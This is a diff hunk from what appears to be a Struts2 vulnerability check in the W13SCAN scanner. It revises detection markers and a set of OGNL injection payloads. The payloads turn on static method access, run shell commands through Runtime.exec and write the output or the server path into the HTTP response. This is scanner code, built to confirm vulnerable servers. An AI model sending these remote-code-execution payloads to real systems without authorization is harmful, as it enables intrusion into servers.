@@ -46,12 +46,12 @@ class W13SCAN(PluginBase):
             ran_check = ran_a - ran_b
             lin = 'expr' + ' ' + str(ran_a) + ' - ' + str(ran_b)
 
-            checks = [str(ran_check), '无法初始化设备 PRN', '??????? PRN', 'Struts2-vuln-Check',
+            checks = [str(ran_check), '无法初始化设备 PRN', '??????? PRN', '<Struts2-vuln-Check>',
                       'Unable to initialize device PRN']
             payloads = [
                 r'''a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23a=@java.lang.Runtime@getRuntime().exec('print test').getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23sbtest.println(%23d),%23sbtest.close())}''',
                 r'''a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23a=@java.lang.Runtime@getRuntime().exec("''' + lin + '''").getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23sbtest.println(%23d),%23sbtest.close())}''',
-                r'a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23k8out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23k8out.print(%23req.getRealPath("Struts2-vuln-Goop")),%23k8out.println(1116),%23k8out.close())}'
+                r'a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23k8out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23k8out.print(%23req.getRealPath("<Struts2-vuln-")),%23k8out.println("Check>"),%23k8out.close())}'
             ]
             headers['Content-Type'] = 'application/x-www-form-urlencoded'
             for payload in payloads:
